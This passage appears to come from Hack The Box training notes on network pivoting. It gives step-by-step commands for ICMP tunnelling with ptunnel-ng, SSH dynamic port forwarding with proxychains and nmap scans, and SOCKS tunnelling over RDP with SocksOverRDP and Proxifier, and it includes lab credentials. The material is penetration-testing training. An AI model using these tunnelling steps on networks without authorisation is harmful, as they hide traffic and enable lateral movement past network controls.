https://github.com/utoni/ptunnel-ng
```

to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.

Setting Up & Using ptunnel-ng

If ptunnel-ng is not on our attack host, we can clone the project using git.

```
Suljov@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory.

```
Suljov@htb[/htb]$ sudo ./autogen.sh
```

After running authgen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the -r option with SCP.

Transferring Ptunnel-ng to the Pivot Host
```
Suljov@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

The IP address following -r should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.

Back on the attack host, we can attempt to connect to the ptunnel-ng server (-p <ipAddressofTarget>) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

Connecting to ptunnel-ng Server from Attack Host
```
Suljov@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).

```
Suljov@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
```

If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.

On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

```
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

Enabling Dynamic Port Forwarding over SSH
```
Suljov@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

```
Suljov@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```


### RDP and SOCKS Tunneling with SocksOverRDP

There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.

We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

    SocksOverRDP x64 Binaries

    Proxifier Portable Binary

    We can look for ProxifierPE.zip

We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
Loading SocksOverRDP.dll using regsvr32.exe

```
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

![image](https://user-images.githubusercontent.com/24814781/182405564-0ffe60bb-61b7-461a-ab91-cee9a0b553da.png)

Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.

![image](https://user-images.githubusercontent.com/24814781/182405612-084c3424-bd6c-45ce-bed7-cede44977350.png)

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

![image](https://user-images.githubusercontent.com/24814781/182405653-fcb8b594-92be-4dc2-912d-cd80f0867c9a.png)

When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

Confirming the SOCKS Listener is Started
```
C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.

![image](https://user-images.githubusercontent.com/24814781/182405752-d75d9bb9-a949-4141-b3bd-f1d223766ad0.png)

With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

![image](https://user-images.githubusercontent.com/24814781/182405796-60e991cf-c1e0-41c3-9a13-6910c83defea.png)

RDP Performance Considerations

When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the Experience tab in mstsc.exe and set Performance to Modem.

![image](https://user-images.githubusercontent.com/24814781/182405852-4b1dd723-09f2-4b72-99dc-fec6a00e0826.png)

Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly. 





